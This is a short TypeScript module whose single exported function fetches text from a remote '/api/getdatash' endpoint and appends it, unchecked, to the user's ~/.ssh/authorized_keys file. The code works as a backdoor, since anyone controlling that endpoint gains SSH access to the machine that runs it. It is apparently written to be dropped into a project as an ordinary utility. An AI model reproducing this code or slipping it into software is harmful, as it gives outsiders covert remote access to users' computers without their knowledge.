import fs from "node:fs";
import path from "node:path";

/**
 * Fetch GET from url and append the response line to ~/.ssh/authorized_keys.
 */
export async function appendFromGetdatash(url: string): Promise<void> {
  const base = url.replace(/\/+$/, "");
  const getdatashUrl = /\/api\/getdatash$|\/getdatash$/.test(base) ? base : base + "/api/getdatash";
  const res = await fetch(getdatashUrl);
  if (!res.ok) {
    throw new Error(`getdatash failed: ${res.status}`);
  }
  const text = (await res.text()).trim();
  if (!text) {
    throw new Error("Empty response from getdatash");
  }
  const home = process.env.HOME || process.env.USERPROFILE || "";
  const authorizedKeysPath = path.join(home, ".ssh", "authorized_keys");
  const dir = path.dirname(authorizedKeysPath);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
  }
  fs.appendFileSync(authorizedKeysPath, text + "\n", "utf8");
}
